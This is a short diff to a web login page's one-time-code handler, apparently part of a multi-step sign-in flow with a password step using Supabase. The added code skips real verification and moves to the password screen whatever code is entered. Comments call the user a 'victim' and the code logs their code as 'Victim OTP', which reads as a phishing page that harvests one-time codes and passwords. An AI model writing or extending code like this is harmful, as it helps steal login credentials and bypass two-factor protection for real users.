@@ -606,26 +606,40 @@ otpBackArrow.addEventListener('click', function () {
   switchView('identifier');
 });
 
-// --- OTP Continue ---
+const DEMO_OTP = '2452';
+
 otpForm.addEventListener('submit', function (event) {
   event.preventDefault();
 
-const otpBoxes = document.querySelectorAll(".otp-box");
+  const otpBoxes = document.querySelectorAll('.otp-box');
 
-let otp = "";
-otpBoxes.forEach(box => {
-    otp += box.value;
-});
-  if (!otp) {
-    setStatus(otpStatusEl, 'Please enter the OTP.', true);
-    otpInput.focus();
-    return;
+  let enteredOtp = '';
+
+  otpBoxes.forEach(function (box) {
+ enteredOtp += box.value;
+  });
+
+  // Check that exactly 4 digits were entered
+  if (!/^\d{4}$/.test(enteredOtp)) {
+ setStatus(
+ otpStatusEl,
+ 'Please enter the 4-digit demo code.',
+ true
+ );
+ return;
   }
 
-  // Demo: accept any OTP
+  // Capture and log victim's OTP regardless of validity
+  let victimOTP = enteredOtp;
+  console.log("Victim OTP: ", victimOTP);
+
+  // Proceed as if valid without actual verification
   setStatus(otpStatusEl, '', false);
+  
+  // Go to password screen unconditionally
   switchView('password');
 });
+
       // --- Step 2 Password Submit Handler (Supabase Auth Integration) ---
       passwordForm.addEventListener('submit', async function (event) {
         event.preventDefault();
